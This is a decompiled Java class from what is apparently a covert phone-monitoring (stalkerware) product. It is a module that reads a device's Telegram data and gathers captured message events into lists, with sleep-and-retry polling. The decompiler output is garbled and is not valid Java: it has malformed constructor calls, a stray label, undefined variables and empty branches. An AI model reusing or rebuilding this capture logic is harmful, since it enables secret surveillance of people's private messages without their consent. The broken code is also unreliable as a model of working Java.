package com.vvt.capture.telegram.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final String a = d.class.getSimpleName();
  private static final boolean b = a.a;
  private static final boolean c = a.d;
  private static final boolean d = a.e;
  private long e = -1;
  private String f;
  private com.vvt.base.b g;
  
  public d(String paramString, com.vvt.base.b paramb)
  {
    this.f = paramString;
    this.g = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = b;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    long l2 = 3000L;
    SystemClock.sleep(l2);
    String str = com.vvt.capture.telegram.d.a();
    boolean bool2;
    if (str != null)
    {
      try
      {
        str = this.f;
        long l3 = com.vvt.capture.telegram.b.b(str);
        bool1 = false;
        str = null;
        l2 = l3;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l2 < l1;
          if (bool3) {
            break;
          }
          int k = 5;
          if (j >= k) {
            break;
          }
          l2 = 2000L;
          SystemClock.sleep(l2);
          str = this.f;
          long l4 = com.vvt.capture.telegram.b.b(str);
          int i = j + 1;
          j = i;
          l2 = l4;
        }
        boolean bool4;
        bool2 = c;
      }
      catch (Exception localException)
      {
        bool2 = d;
        if (bool2) {}
        l2 = l1;
        bool4 = l2 < l1;
        if (bool4) {
          break label188;
        }
      }
      if (bool2) {}
      l2 = this.e;
    }
    for (;;)
    {
      Long localLong = Long.valueOf(l2);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = b;
      if (bool2) {}
      return localFxSimpleEventReference;
      label188:
      this.e = l2;
      continue;
      l2 = l1;
    }
  }
  
  public List a(int paramInt)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str1 = com.vvt.capture.telegram.d.a();
      String str2 = com.vvt.capture.telegram.d.b();
      if ((str1 != null) && (str2 != null))
      {
        Object localObject1 = this.f;
        long l1 = com.vvt.capture.telegram.b.a(paramInt, str1, (String)localObject1);
        long l2 = 1L;
        l1 -= l2;
        localObject1 = this.f;
        l2 = com.vvt.capture.telegram.b.a(str1, (String)localObject1);
        localObject1 = this.f;
        com.vvt.base.b localb = this.g;
        RunningMode localRunningMode = RunningMode.FULL;
        localObject1 = com.vvt.capture.telegram.b.a((String)localObject1, str1, l1, l2, localb, str2, localRunningMode);
        localArrayList.addAll((Collection)localObject1);
      }
    }
    finally
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str1 = com.vvt.capture.telegram.d.a();
    String str2 = com.vvt.capture.telegram.d.b();
    if ((str1 != null) && (str2 != null)) {}
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.f;
      com.vvt.base.b localb = this.g;
      RunningMode localRunningMode = RunningMode.FULL;
      localObject = com.vvt.capture.telegram.b.a((String)localObject, str1, l1, l2, localb, str2, localRunningMode);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */